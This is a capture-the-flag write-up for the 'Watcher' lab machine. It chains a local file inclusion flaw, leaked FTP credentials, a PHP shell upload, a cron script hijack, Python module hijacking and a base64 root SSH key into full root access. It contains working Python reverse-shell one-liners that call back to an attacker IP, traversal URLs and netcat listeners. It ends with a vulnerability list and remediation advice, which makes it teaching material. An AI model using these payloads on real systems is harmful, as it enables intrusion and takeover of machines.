## Watcher

Medium-difficulty Linux boot2root machine. A Jekyll blog contains a Local File Inclusion (LFI) flaw in `post.php`, which exposes an FTP password in a sensitive file. FTP access allows uploading a PHP file into a directory the LFI can reach, giving a shell as `www-data`. Lateral movement across users uses sudo rules, a writable cron script, and a whitelist bypass in a Python script. A base64-encoded root key stored in a backup directory gives final root access.

**Target:** 10.49.178.119 (watcher)
**Difficulty:** Medium
**Attack Path:** Port scan → LFI in post.php → robots.txt → FTP credentials → FTP upload → LFI to RCE → www-data → toby → cron hijack as mat → sudo python bypass as will → base64 root key → root

---

### PART 1: RECONNAISSANCE

**Full port scan**

```
nmap -p- 10.49.178.119
```

```
21/tcp  open  ftp   vsftpd 3.0.5
22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp  open  http  Apache 2.4.41 (Ubuntu)
```

**Service and version scan**

```
nmap -sV -sC -p 21,22,80 10.49.178.119
```

**Key findings:**
- FTP does not allow anonymous login.
- The site is "Corkplacemats," generated with Jekyll v4.1.1.
- Most static pages do not open, but the "back to top" link points to a dynamic page.

---

### PART 2: LOCAL FILE INCLUSION

**The vulnerable link**

The back-to-top link on the site leads to:

```
http://10.49.178.119/post.php?post=/etc/passwd
```

The response returns the contents of `/etc/passwd`, which confirms a Local File Inclusion (LFI) vulnerability. The `post` parameter is used to load files without validation.

**Why this matters:** Any file readable by the web server can now be read, including configuration files, credentials, and source code.

---

### PART 3: DIRECTORY ENUMERATION AND ROBOTS.TXT

**Directory fuzzing**

```
gobuster dir -u http://10.49.178.119/ -w /usr/share/wordlists/dirb/common.txt
```

```
/css          (301)
/images       (301)
/robots.txt   (200)
/server-status (403)
```

**Robots file**

```
curl http://10.49.178.119/robots.txt
```

```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

The file lists two paths that are otherwise hidden. Requesting `secret_file_do_not_read.txt` directly returns 403 Forbidden, but the LFI can read it.

---

### PART 4: READING THE SECRET FILE VIA LFI

```
http://10.49.178.119/post.php?post=secret_file_do_not_read.txt
```

**Output:**

```
Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved
to /home/ftpuser/ftp/files.

ftpuser:<password>
```

**Lesson:** Access controls on a file do not protect it from a file inclusion flaw that runs with different permissions.

---

### PART 5: FTP ACCESS AND FLAG 2

**Log in**

```
ftp 10.49.178.119
Name: ftpuser
Password: <password from secret file>
```

**List the directory**

```
ls
```

```
drwxr-xr-x    2 1001  1001  4096 Dec 03 2020 files
-rw-r--r--    1 0     0       21 Dec 03 2020 flag_2.txt
```

**Download flag 2**

```
get flag_2.txt
```

**Read it through LFI** (an alternative to downloading):

```
http://10.49.178.119/post.php?post=../../../home/ftpuser/ftp/flag_2.txt
```

---

### PART 6: UPLOADING A PHP SHELL

**Problem:** Uploading to the FTP root fails with a permission error:

```
put rev.php
553 Could not create file.
```

**Solution:** The `files` subdirectory is writable.

```
cd files
put rev.php
226 Transfer complete.
```

**Why this works:** The FTP root is read-only for `ftpuser`, but the `files` subdirectory is writable. The LFI can reach that path, so an uploaded PHP file will run when requested.

---

### PART 7: LFI TO REMOTE CODE EXECUTION

**Attacker: start a listener**

```
nc -lvnp 4444
```

**Trigger the uploaded shell via LFI**

```
http://10.49.178.119/post.php?post=../../../home/ftpuser/ftp/files/rev.php
```

**Result:**

```
connect to [192.168.136.156] from (UNKNOWN) [10.49.178.119] 55982
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

### PART 8: SHELL STABILIZATION

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo && fg
export TERM=xterm
```

---

### PART 9: ESCALATION TO TOBY

**Check sudo rights**

```
sudo -l
```

```
User www-data may run the following commands on ip-10-49-178-119:
    (toby) NOPASSWD: ALL
```

The `www-data` user can run any command as `toby` without a password.

**Switch user**

```
sudo -u toby -i
```

**Files in toby's home**

```
ls
flag_4.txt  jobs  note.txt
```

**Find flag 3**

```
find / -type f -name 'flag_3.txt' 2>/dev/null
```

```
/var/www/html/more_secrets_a9f10a/flag_3.txt
```

**Read toby's note**

```
cat note.txt
```

```
Hi Toby,
I've got the cron jobs set up now so don't worry about getting that done.
Mat
```

---

### PART 10: CRON JOB HIJACK TO MAT

**Find the scheduled task**

The system crontab (`/etc/crontab`) contains:

```
*/1 * * * * mat /home/toby/jobs/cow.sh
```

This runs `cow.sh` as `mat` every minute.

**Inspect the script**

```
cat /home/toby/jobs/cow.sh
```

```bash
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

**Problem:** The script is in `/home/toby/jobs/`, which `toby` can write to. Any change made here runs as `mat` on the next cron cycle.

**Replace the script with a reverse shell**

```bash
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.136.156",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**Attacker: start a listener**

```
nc -lvnp 5555
```

After the next minute, the cron job runs and connects back:

```
connect to [192.168.136.156] from (UNKNOWN) [10.49.178.119] 40352
mat@ip-10-49-178-119:~$
```

**Mat's files**

```
ls
cow.jpg  flag_5.txt  note.txt  scripts
cat flag_5.txt
```

---

### PART 11: SUDO PYTHON SCRIPT WHITELIST BYPASS TO WILL

**Read mat's note**

```
cat note.txt
```

```
Hi Mat,
I've set up your sudo rights to use the python script as my user. You can only
run the script with sudo so it should be safe.
Will
```

**Check sudo rights**

```
sudo -l
```

```
User mat may run the following commands on ip-10-49-178-119:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
```

**Inspect the script**

```python
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
    print("Invalid command!")
    exit()

os.system(cmd)
```

**How the script works:** The script imports `get_command` from a local module named `cmd`. It then checks the result against a whitelist. The check is done on the imported module's output, and the same directory contains `cmd.py`, which Python imports.

**Exploit: replace the imported module**

The `scripts` directory is writable by `mat`. Python loads `cmd.py` from the current directory before anything else, so replacing it runs our code as `will`:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.136.156",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

**Attacker: start a listener**

```
nc -lvnp 6666
```

**Run the script via sudo**

```
sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py ls
```

**Result:**

```
connect to [192.168.136.156] from (UNKNOWN) [10.49.178.119] 48674
will@ip-10-49-178-119:/home/mat/scripts$
```

**Will's files**

```
cd ~
ls
flag_6.txt
cat flag_6.txt
```

---

### PART 12: BASE64 ROOT KEY TO ROOT

**Find the backup directory**

```
cd /opt
ls
backups
cd backups
ls
key.b64
```

**Read the encoded key**

```
cat key.b64
```

**Decode it on the attacker machine**

Copy the encoded string and decode it:

```
base64 -d key.b64 > id_rsa
chmod 600 id_rsa
```

**Log in as root**

```
ssh -i id_rsa root@10.49.178.119
```

```
root@ip-10-49-178-119:~# ls
flag_7.txt  snap
cat flag_7.txt
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port scan (21, 22, 80)
  └─ Service detection

PHASE 2: Web Enumeration
  ├─ LFI in post.php
  ├─ gobuster finds robots.txt
  └─ robots.txt lists secret file

PHASE 3: Credential Discovery
  ├─ Read secret_file_do_not_read.txt via LFI
  └─ FTP credentials for ftpuser

PHASE 4: FTP Access
  ├─ Log in to FTP
  ├─ Download flag_2.txt
  └─ Upload rev.php to files/ subdirectory

PHASE 5: LFI to RCE
  ├─ Request rev.php via post.php LFI
  └─ Shell as www-data

PHASE 6: Escalation to toby
  ├─ sudo -l: (toby) NOPASSWD: ALL
  └─ sudo -u toby -i

PHASE 7: Cron Hijack to mat
  ├─ /etc/crontab runs cow.sh as mat every minute
  ├─ Replace cow.sh with reverse shell
  └─ Shell as mat

PHASE 8: Module Injection to will
  ├─ sudo -l: will_script.py as will
  ├─ Replace cmd.py with reverse shell
  └─ Shell as will

PHASE 9: Root
  ├─ /opt/backups/key.b64 contains base64 SSH key
  ├─ Decode and save as id_rsa
  └─ SSH as root
```

---

### VULNERABILITIES

1. **Local File Inclusion in post.php (Critical)**
   - The `post` parameter loads arbitrary files without validation
   - Exposes system files and sensitive application files

2. **Sensitive Credentials in Readable Files (High)**
   - FTP password stored in a file accessible through LFI
   - Credentials in `secret_file_do_not_read.txt`

3. **Writable Upload Directory Reachable via LFI (Critical)**
   - FTP `files/` directory is writable and accessible to the web server
   - PHP upload leads to remote code execution

4. **Overly Permissive Sudo Rule (Critical)**
   - `www-data` can run any command as `toby`

5. **Writable Cron Script (High)**
   - `cow.sh` is writable by `toby` but executed by `mat` via cron

6. **Module Import Hijacking (High)**
   - Writable directory with a local `cmd.py` lets an attacker replace an imported module
   - Whitelist check is bypassed through the import

7. **Private Key Stored in Encoded Form in Backups (Critical)**
   - Root's SSH private key is stored in `/opt/backups/` in base64
   - Readable by the `will` user

---

### REMEDIATION

```
├─ Validate and restrict file inclusion parameters to an allow list
├─ Store credentials outside the web root and never in readable files
├─ Restrict FTP upload directories so they are not served by the web application
├─ Remove NOPASSWD: ALL sudo rules; grant specific commands only
├─ Restrict write permissions on scripts executed by cron (root-owned, not writable by others)
├─ Do not import modules from user-writable directories; use absolute paths and fixed module locations
├─ Do not store private keys in backup directories; rotate any exposed keys
├─ Audit robots.txt and remove paths that point to sensitive resources
└─ Monitor file changes in cron and script directories
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port and service enumeration)
- gobuster (directory discovery)
- curl or browser (LFI requests)
- ftp client (credential use and file upload)
- nc (listeners)
- python3 (shell stabilization and payloads)
- base64 (key decoding)
- ssh (key-based root login)

**Key Insight:** An LFI gave credentials, and an FTP directory was reachable through the same LFI, which turned upload into code execution. Each user account was reached through a misconfigured rule, a writable script, or a writable module, until a root key was found in an encoded backup.

**Concepts to Study:**
- Local file inclusion and path traversal
- robots.txt as an information source
- Cron job hijacking via writable scripts
- Python module import hijacking
- Sudo rule misconfigurations
- Key management and backup security



# Jai Shri Ram
